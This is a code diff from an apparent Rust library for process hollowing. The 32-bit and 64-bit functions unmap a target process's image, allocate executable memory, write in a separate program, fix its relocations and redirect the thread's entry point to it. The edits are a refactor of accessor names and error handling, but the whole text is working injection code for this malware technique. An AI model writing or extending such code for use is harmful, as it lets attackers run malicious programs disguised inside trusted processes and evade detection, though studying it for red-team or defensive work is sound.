@@ -42,24 +42,24 @@ pub unsafe fn hollow32(src: impl Into<String>, dest: impl Into<String>) -> Resul
 
     // read src program and mapping
     let mut buffer = shared::get_binary_from_file(src.into())?;
-    let mut container = x86::PE_Container::new(dest_image_address, &mut buffer[0] as *const _ as *mut c_void);
+    let mut container = x86::PE_Container::new(dest_image_address, &mut buffer[0] as *const _ as *mut c_void)?;
 
     // Unmapping image from dest process
-    if NtUnmapViewOfSection(hp, container.target_image_base) != STATUS_SUCCESS {
+    if NtUnmapViewOfSection(hp, container.target_base_address()) != STATUS_SUCCESS {
         bail!("could not unmapping image from dest process. NtUnmapViewOfSection calling was failed.")
     };
 
     // Allocate memory for src program
     let new_address = VirtualAllocEx(
-        hp, dest_image_address as *mut _, container.get_payload_optional_headers().SizeOfImage as usize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
+        hp, dest_image_address as *mut _, container.get_payload_image_size() as usize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
     );
-    if new_address as u64 == 0x0 as u64 {
+    if new_address as u32 == 0x0 as u32 {
         bail!("could not allocate of the remote process image. VirtualAllocEx calling was failed.")
     };
     container.change_target_image_base(new_address);
 
     // calculate delta before to change base address
-    let delta = shared::Delta::calculate_delta(container.target_image_base as usize, container.payload_base() as usize);
+    let delta = shared::Delta::calculate_delta(container.target_base_address() as usize, container.payload_base_address() as usize);
 
     // change base address to allocated memory address
     container.change_payload_image_base(new_address);
@@ -69,7 +69,7 @@ pub unsafe fn hollow32(src: impl Into<String>, dest: impl Into<String>) -> Resul
     container.remote_delta_relocation(hp, delta)?;
 
     // create context, and change entry point
-    let entry_point = container.target_image_base as usize + container.get_payload_optional_headers().AddressOfEntryPoint as usize;
+    let entry_point = container.target_base_address() as usize + container.pe.entry as usize;
     let mut context = zeroed::<WOW64_CONTEXT>();
     context.ContextFlags = WOW64_CONTEXT_FULL;
 
@@ -111,7 +111,7 @@ pub unsafe fn hollow64(src: impl Into<String>, dest: impl Into<String>) -> Resul
 
     // read src program and mapping
     let mut buffer = shared::get_binary_from_file(src.into())?;
-    let mut container = x64::PE_Container::new(dest_image_address, &mut buffer[0] as *const _ as *mut c_void);
+    let mut container = x64::PE_Container::new(dest_image_address, &mut buffer[0] as *const _ as *mut c_void)?;
 
     // Unmapping image from dest process
     if NtUnmapViewOfSection(hp, dest_image_address as *mut _) != STATUS_SUCCESS {
@@ -120,7 +120,7 @@ pub unsafe fn hollow64(src: impl Into<String>, dest: impl Into<String>) -> Resul
 
     // Allocate memory for src program
     let new_address = VirtualAllocEx(
-        hp, dest_image_address as *mut _, container.get_payload_optional_headers().SizeOfImage as usize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
+        hp, dest_image_address as *mut _, container.get_payload_optional_headers().windows_fields.size_of_image as usize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
     );
     if new_address as u64 == 0x0 as u64 {
         bail!("could not allocate of the remote process image. VirtualAllocEx calling was failed.")
@@ -128,7 +128,7 @@ pub unsafe fn hollow64(src: impl Into<String>, dest: impl Into<String>) -> Resul
     container.change_target_image_base(new_address);
 
     // calculate delta before to change base address
-    let delta = shared::Delta::calculate_delta(container.target_image_base as usize, container.payload_base() as usize);
+    let delta = shared::Delta::calculate_delta(container.target_base_address() as usize, container.payload_base_address() as usize);
 
     // change base address to allocated memory address
     container.change_payload_image_base(new_address);
@@ -138,7 +138,7 @@ pub unsafe fn hollow64(src: impl Into<String>, dest: impl Into<String>) -> Resul
     container.remote_delta_relocation(hp, delta)?;
 
     // create context, and change entry point
-    let entry_point = dest_image_address as u64 + container.get_payload_optional_headers().AddressOfEntryPoint as u64;
+    let entry_point = dest_image_address as u64 + container.pe.entry as u64;
     let mut context = zeroed::<CONTEXT>();
     context.ContextFlags = CONTEXT_FULL;
 
